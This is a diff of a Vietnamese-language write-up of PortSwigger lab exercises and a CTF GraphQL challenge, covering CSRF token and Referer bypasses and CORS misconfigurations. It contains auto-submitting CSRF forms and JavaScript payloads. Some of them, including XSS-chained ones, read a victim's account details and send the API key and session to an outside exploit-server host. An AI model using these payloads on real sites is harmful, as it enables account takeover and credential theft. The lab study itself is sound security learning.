@@ -1,18 +1,47 @@
 
 * [Portswigger - Cross-site request fogery](#pcsrf)
-  - [1. CSRF vulnerability with no defenses](#pcsrf1)
-  - [2. CSRF where token validation depends on request method](#pcsrf2)
-  - [3. CSRF where token validation depends on token being present](#pcsrf3)
-  - [4. CSRF where token is not tied to user session](#pcsrf4)
-  - [5. CSRF where token is tied to non-session cookie](#pcsrf5)
-  - [6. CSRF where token is duplicated in cookie](#pcsrf6)
-  - [7. SameSite Lax bypass via method override](#pcsrf7)
-  - [8. SameSite Strict bypass via client-side redirect](#pcsrf8)
-  - [9. SameSite Strict bypass via sibling domain](#pcsrf9)
-  - [10. SameSite Lax bypass via cookie refresh](#pcsrf10)
-  - [11. CSRF where Referer validation depends on header being present](#pcsrf11)
-  - [12. CSRF with broken Referer validation]()
+  - [1. CSRF where token validation depends on request method](#pcsrf2)
+  - [2. CSRF where token validation depends on token being present](#pcsrf3)
+  - [3. CSRF where token is not tied to user session](#pcsrf4)
+  - [4. CSRF where token is tied to non-session cookie](#pcsrf5)
+  - [5. CSRF where token is duplicated in cookie](#pcsrf6)
+  - [6. CSRF where Referer validation depends on header being present](#pcsrf11)
+  - [7. CSRF with broken Referer validation](#pscrf7)
+* [Portswigger - Cross-origin resource sharing](#cor)
+  - [1. CORS vulnerability with basic origin reflection](#cor1)
+  - [2. CORS vulnerability with trusted null origin](#cor2)
+  - [3. CORS vulnerability with trusted insecure protocols](#cor3)
 
+
+### Đợt ctf footbar mình làm mỗi bài inspect :(( bài còn lại hay mà crytpo lỏ quá nên chưa hấp thụ được:
+
+Bài inspect vào giao diện như sau: 
+
+![image](https://user-images.githubusercontent.com/104350480/225637440-fc98837f-c0fa-49f3-887d-402d9d39b904.png)
+
+Bài này dùng dirseach ta quét được 1 đường dẫn: /graphql
+
+Dạng này truy vấn api, nên mình thử script query xem sao: 
+
+```
+/graphql?query={__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
+
+```
+Ta đọc 1 vài trường thì có vẻ có thể khai thác bằng trích xuất thông tin của Object trong graphQL
+
+![image](https://user-images.githubusercontent.com/104350480/225637848-541f822f-8443-4682-b56a-2a3654286c24.png)
+
+Ta để ý trường secret của RootQuery, có thể ở đây khai thác được gì đấy nếu ta trích xuất được, ném dạng truy vấn { secret } vào:
+
+![image](https://user-images.githubusercontent.com/104350480/225638835-bc8529bd-7749-458c-8aa7-42ec0aefe28e.png)
+
+Nó gợi ý cho ta trường text luôn:
+
+![image](https://user-images.githubusercontent.com/104350480/225638948-bf1883d9-3cfb-49a4-aac1-6969197f637d.png)
+
+Thử vào ta được 1 đống flag, cái này thì bruteforce hoặc dùng tay thử từng cái thôi.
+
+# Csrf -  Cross-site request fogery <a name='pcsrf'></a>
 ## What is Csrf?
 - csrf hay cross-site request fogery là một lỗ hổng bảo mật web cho phép kẻ tấn công khiến người dùng thực hiện các hành động mà họ không có ý định thực hiện. Nó cũng như xss cho phép kẻ tấn công phá vỡ sop (same origin policy), được thiết kế để ngăn chặn các trang web khác nhau can thiệp lẫn nhau. 
 Khi thực hiện một cuộc tấn công csrf kẻ tấn công sẽ tạo ra một trang web giả mạo, trong đó chứa các yêu cầu http được thiết kế để khai thác lỗ hổng của trình duyệt web người dùng. Khi người dùng truy cập vào trang web giả mạo, các yêu cầu http sẽ được tự động thực hiện đến 1 trang web khác mà người dùng đã đăng nhập trước đó. Do đó kẻ tấn công có thể lừa được hệ thống để thực hiện các hành động không mong muốn mà không cần biết được tên người dùng và mật khẩu của họ.
@@ -56,7 +85,7 @@ Trước hết để có thể thực hiện được 1 cuộc tấn công csrf,
 + Thứ 2 là cookie-based session handling: ứng dụng sẽ sử dụng session cookie để thực hiện xử lí phiên.
 + No unpredictable request parameters: ở đây ta sẽ có chủ yếu 2 tham số để tấn công là csrf và email, với tham số email thì ta biết được vì là tham số để ta tấn công, còn csrf là mã ngẫu nhiên kh đoán trước được, nhưng ta có thể dựa vào cách web triển khai để khai thác nó cho hợp lí.
 
-### [1. CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)
+### [1. CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)<a name='pcsrf1'></a>
 
 Bài lab này mô phỏng việc website xác thực csrf token phục thuộc vào phương thức yêu cầu: 
 Đầu tiên ta vào phần đăng nhập với mục đích bắt request của thay đổi email:
@@ -91,7 +120,7 @@ document.getElementById('csrf').submit();
 
 ```
 
-### [2. CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present)
+### [2. CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present)<a name='pcsrf2'></a>
 
 - Một số ứng dụng xác thực csrf token khi nó xuất hiện nhưng bỏ qua xác thực nếu mã thông báo bị bỏ qua, ta vẫn dùng cái trên được luôn, vì đăng nào bỏ csrf cũng được: 
 
@@ -105,7 +134,7 @@ document.getElementById('csrf').submit();
 </script> 
 
 ```
-### [3. CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)
+### [3. CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session) <a name='pcsrf3'></a>
 
 Tình huống của bài lab này là ứng dụng web nó không hề xác thực xem csrf trong request có thuộc về 1 session của 1 user liên quan hay không. Việc này có thể hình dung là bên server tạo 1 kho chứa các token được sinh ra, miễn là token được lấy từ trong này ra thì server sẽ coi nó là hợp lệ. Với bài lab này ta sẽ chỉ cần lấy thêm cái csrf token được cấp phát sẵn.
 
@@ -128,7 +157,7 @@ document.getElementById('csrf').submit();
 </script> 
 ```
 
-### [4. CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)
+### [4. CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)<a name='pcsrf4'></a>
 
 Bài lab này thì nó khác ở bài lab trước ở chỗ nó có gắn thêm csrf token vào cả phần session: cookie, nhưng mà cookie ở đây không phục vụ cho việc theo dỗi user session. Điều cần lưu ý ở đây là attackere sẽ cần có 1 phương án để cài cái non-session cookie vào browser của nạn nhân, từ đó có 1 vụ tấn công thành công được.
 
@@ -159,7 +188,7 @@ Bên server đã chấp nhận, sau đó ta sẽ thực hiện tương tự như
 
 ```
 
-## [5. CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)
+## [5. CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)<a name='pcsrf5'></a>
 
 Bài này là 1 ví dụ đơn giản hơn chall trước nhưng ý tưởng vẫn thế, ta chỉ cần thay csrfKey ở bài trước thành csrf ở bài này, đặc biệt là giá trị csrf ở đây được tùy chỉnh miễn là 2 cái giống nhau là được nên ta có thể dùng script như bên dưới để thực hiện luôn: 
 
@@ -177,7 +206,8 @@ Bài này là 1 ví dụ đơn giản hơn chall trước nhưng ý tưởng v�
  
  ```
 
-## [10. CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present)
+
+## [6. CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present)<a name='pcsrf6'></a>
 
 Trong kịch bản ở 2 bài lab cuối 10 và 11 này, ngoài kiểu chống csrf attack với csrf token và bypass csrf samesite thì ứng dụng có thể sử dụng cả http referer header.
 
@@ -205,7 +235,7 @@ Với phần body:
 </form> 
 <script>document.getElementById('csrf').submit();</script>
 ```
-## [11. SRF with broken Referer validation](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken)
+## [7. SRF with broken Referer validation](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken)<a name='pcsrf7'></a>
 
 Ở bài lab tiếp theo này thì đã được xử lí tình huống ở bài lab trước, khi cắt đi referer header thì sẽ bị báo lỗi:
 
@@ -240,7 +270,7 @@ Có thể ở đây là do một số browser sẽ triển khai giải pháp b�
 Và bài lab được giải quyết :(
 
 
-## CORS - Cross origin resource sharing
+# CORS - Cross origin resource sharing <a name='cor'></a>
 
 ### 1. Cross-origin resource sharing - cors attack là gì?
 
@@ -352,7 +382,7 @@ xhr.send();
   Nó cho phép trang web kia thực hiện truy xuất tài nguyên từ trang web ngân hàng và các cuộc tấn công có thể diễn ra. Ở đây Cors vul được sinh ra từ việc cách cấu hình cors có vấn đề gây ra rủi ro bảo mật.
 Việc cho phép truy cập vào tài nguyên giữa các tên miền khác nhau đôi khi là bắt buộc vì 1 số trang web về mua sắm thì cần phải tin tưởng các trang web ngân hàng khác để có thể thực hiện được việc thanh toán. Còn dài quá, thôi vào bài lab cho dễ hiểu: 
 
-  ### [1. CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
+  ### [1. CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)<a name='cor1'></a>
   
   Ta đăng nhập vào tài khoản với wiener:peter :
 
@@ -418,11 +448,158 @@ Ta ta có thể sử dụng script như sau để exploit bên phái server và 
 
   Dù trên trang web kh hiển thị gì nhưng ta đã lấy được APIkey của user click vào mà ở đây là wiener.
   
-  ### [2. Lab: CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
+  ### [2. Lab: CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)<a name='cor2'></a>
   
-  - Tiếp theo ở bài lab thứ hai này ta sẽ đến 1 tình huống thực tế hơn, cụ thể là ở một số ứng dụng hỗ trợ mutiple origins thông qua việc sử dụng allowed origin whitelist ( tức là danh sách các origin được cấp phép). Lúc này khi nhận 1 cors request, ứng dụng sẽ soi cái origin trong request rồi đối chiếu với allowed origin whitelist. Nếu xác nhận có thông tin tương ứng trong cái whitelist, origin này sẽ đâm vào Access-Control-Allow-Origin header của response ( và ta sẽ có thể truy cập được).
+  - Ở bài trước thì cái Access-Allow-origin ta có thể truy cập với bất kì miền nào.
+  Ta test thử ở bài này: 
   
-- Cụ thể trong tình huống này ta sẽ khai thác cái specifiction hỗ trợ null value của origin header. Thông thường, browser sẽ gửi null value trong Origin header trong 
+  ![image](https://user-images.githubusercontent.com/104350480/225598124-f7405bef-d38b-464b-9a3b-ace7edd06d02.png)
+
+  Có vẻ không thành công, ta sẽ đi thử tiếp với trường null value:
+  
+  ![image](https://user-images.githubusercontent.com/104350480/225598652-71c28683-b3e7-41c7-9b62-1d3c858d385f.png)
+
+  Oke vậy bài này ta sẽ khai thác với giá trị null, vẫn vậy bài này cho Access-Control-Allow-Credentials: true nên ta có thể khai thác tương tự như trên và gửi cho admin click vào.
+Vẫn như đoạn code trên nhưng ta gần phải thêm trường origin là null thì mới có thể tấn công được. Ở đây ta dùng <iframe>:
+Ý tưởng để giải quyết bài lab này là ta sẽ sử dụng một iframe để tạo ra một kết nối đến trang web đích và sử dụng JavaScript để thực hiện một yêu cầu CORS bằng XMLHttpRequest. Khi truy cập trang web đích thông qua iframe, địa chỉ nguồn của yêu cầu CORS sẽ được đặt thành "null" cho phép truy cập từ bất kỳ nguồn nào. 
+  
+  ```
+  <h1>Hello world</h1>
+<iframe style="display: none" sandbox="allow-scripts" srcdoc="
+<script>
+
+    var req = new XMLHttpRequest();
+    
+    var url='https://0a6e00c80341ecccc128a7a300a50073.web-security-academy.net'
+
+    req.open('GET',url+'/accountDetails',true);
+
+    req.withCredentials = true;
+    req.onreadystatechange = function() {
+      if (req.readyState == XMLHttpRequest.DONE){
+            fetch('https://exploit-0af5009f03baecd1c119a527014f00eb.exploit-server.net/log?key=' + req.responseText)
+    }
+    };
+
+    req.send(null);
+
+
+</script>" </iframe>
+  
+  ```
+  
+  ![image](https://user-images.githubusercontent.com/104350480/225601927-db0b5eb8-b487-4da3-9876-7d4b7beb120c.png)
+
+  > {%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22YrjgeymGzLj8Hm7ALhSeh4EvNaPbgs61%22,%20%20%22sessions%22:%20[%20%20%20%20%22gh3hzDBNDEpNOoTqdDGqiEibkzhCqGSo%22%20%20]}
+  
+  Decode:
+  
+  > {  "username": "administrator",  "email": "",  "apikey": "YrjgeymGzLj8Hm7ALhSeh4EvNaPbgs61",  "sessions": [    "gh3hzDBNDEpNOoTqdDGqiEibkzhCqGSo"  ]}
+
   
   
+  ## [3. Lab: CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)<a name='cor3'></a>
   
+Mở bài lab, vẫn như bài trước ta mở /accountDetails và test: 
+  
+  Trường hợp với origin bất kì kh ổn:
+  
+  ![image](https://user-images.githubusercontent.com/104350480/225615962-a155b7cc-1cca-4b34-b292-7acc0a9b3846.png)
+
+  Và null cũng vậy:
+  
+  ![image](https://user-images.githubusercontent.com/104350480/225616101-d6d6ac54-3e19-4f32-9671-f44332766ad9.png)
+
+  Bài lab này có vẻ chỉ chấp nhận origin từ chính nó với http và https:
+  
+  ![image](https://user-images.githubusercontent.com/104350480/225616281-e2e5f6df-b1f8-4145-9474-c15958d671ec.png)
+
+  Nhưng ngoài ra khi ta thử thêm cả trường subdomain vào thì có vẻ ổn:
+  
+  ![image](https://user-images.githubusercontent.com/104350480/225616445-b4df3b32-12ff-4e96-a434-a9300b864d88.png)
+  
+  Vậy là ý tưởng của ta bây giờ là cần phải viết script mà sao cho khi nó thực thi thì origin là 1 subdomain của trang web này thì mới tấn công được.
+  Bài này thì ý tưởng của người ta mình thấy khá hay, kiểu tìm 1 điểm để thực thi xss mà tại điểm đó có chứa subdomain của miền cần, khi xss được thì trang nó sẽ chứa origin ta cần và việc thực thi thì sẽ được gói gọn bên trong script như các bài trước: 
+  
+  Khi checkstock thì số lượng được hiển trị trên 1 trang subdomain: 
+  
+  ![image](https://user-images.githubusercontent.com/104350480/225619517-1e63fe6b-8c29-4f15-a1c0-60e08d14dd75.png)
+
+  Và như ý tưởng của bài lab thì ta tấn công xss vào đây thôi:
+  
+  ![image](https://user-images.githubusercontent.com/104350480/225620412-b96efc9a-576c-43d4-9ff2-c0d4132c8ddd.png)
+
+  
+  Oke giờ xss được thì tiếp theo ta cần truyền scipt bên trong đoạn gây xss là được, trang web sẽ thực thi lấy origin  là trang web có subdomain và thỏa mãn yêu càu:
+  
+  Đoạn code vẫn dùng:
+  
+  ```
+  <h1>Hello world</h1>
+
+
+<script>
+
+    var req = new XMLHttpRequest();
+    
+    var url='https://0a22007e03ab2b0bc6e85a25005d0020.web-security-academy.net'
+
+    req.open('GET',url+'/accountDetails',true);
+
+    req.withCredentials = true;
+    req.onreadystatechange = function() {
+      if (req.readyState == XMLHttpRequest.DONE){
+            fetch('https://exploit-0a71005b038a2b56c64f594901da006e.exploit-server.net/exploit/log?key=' + req.responseText)
+    }
+    }
+
+    req.send(null);
+
+
+</script>
+  
+  ```
+  
+  Nhưng ở đây ta cần chuyển hướng trang sang subdomain và thực thi xss với script như bên trên và khai thác như sau:
+  
+  ```
+  
+  <h1>Hello world</h1>
+<script>
+document.location="https://stock.0a22007e03ab2b0bc6e85a25005d0020.web-security-academy.net/?productId=1<script>var req = new XMLHttpRequest();var url='https://0a22007e03ab2b0bc6e85a25005d0020.web-security-academy.net'
+req.open('GET',url+'/accountDetails',true);
+req.withCredentials = true;
+req.onreadystatechange = function() {
+      if (req.readyState == XMLHttpRequest.DONE){
+            fetch('https://exploit-0a71005b038a2b56c64f594901da006e.exploit-server.net/exploit/log?key=' %3b req.responseText)
+    }
+}
+req.send(null);
+</script>&storeId=1
+</script>
+  
+  ```
+  
+  Nhưng gửi không được, check lỗi :
+  
+  ![image](https://user-images.githubusercontent.com/104350480/225622382-1c9ca332-de6c-41a8-85d7-80ddfbd3887c.png)
+  
+  Ở đây có lỗi "" , ta cần mã hóa lại.
+
+```  
+  
+    <script>
+      document.location="https://stock.0a22007e03ab2b0bc6e85a25005d0020.web-security-academy.net/?productId=1<script>var req= new XMLHttpRequest();var url='https://0a22007e03ab2b0bc6e85a25005d0020.web-security-academy.net';req.onreadystatechange = function(){if (req.readyState == XMLHttpRequest.DONE){fetch('https://exploit-0a71005b038a2b56c64f594901da006e.exploit-server.net/exploit/log?key=' %2b req.responseText)};};req.open('GET', url %2b '/accountDetails', true);req.withCredentials = true;req.send(null);%3c/script>&storeId=1"
+    </script>
+
+   ```
+
+Nhưng mà có vẻ thực thi đoạn trên vẫn bị lỗi, mình cũng chưa hiểu sai chỗ nào luôn, thực hiện vậy mà nó vẫn báo lỗi là kh có access-control-allow-origin. Mà thử 1 đoạn code tương tự lại được: 
+
+  ```
+      <script>
+    document.location="http://stock.0a22007e03ab2b0bc6e85a25005d0020.web-security-academy.net/?productId=1<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a22007e03ab2b0bc6e85a25005d0020.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a71005b038a2b56c64f594901da006e.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+        
+        ````
+ ![image](https://user-images.githubusercontent.com/104350480/225642481-c6914ca8-0a86-4f03-b110-4f17536907e2.png)
